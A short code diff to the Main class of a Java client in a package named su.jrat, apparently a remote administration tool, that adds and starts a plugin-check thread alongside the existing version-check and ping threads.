@@ -21,6 +21,7 @@ import su.jrat.client.settings.AbstractSettings;
 import su.jrat.client.settings.Settings;
 import su.jrat.client.settings.Statistics;
 import su.jrat.client.settings.Theme;
+import su.jrat.client.threads.RunnableCheckPlugins;
 import su.jrat.client.threads.ThreadCheckVersion;
 import su.jrat.client.threads.ThreadPing;
 import su.jrat.client.ui.dialogs.DialogEula;
@@ -142,6 +143,7 @@ public class Main {
 		}
 
 		new ThreadCheckVersion().start();
+		new Thread(new RunnableCheckPlugins()).start();
 		new ThreadPing().start();
 
 		instance.setVisible(true);
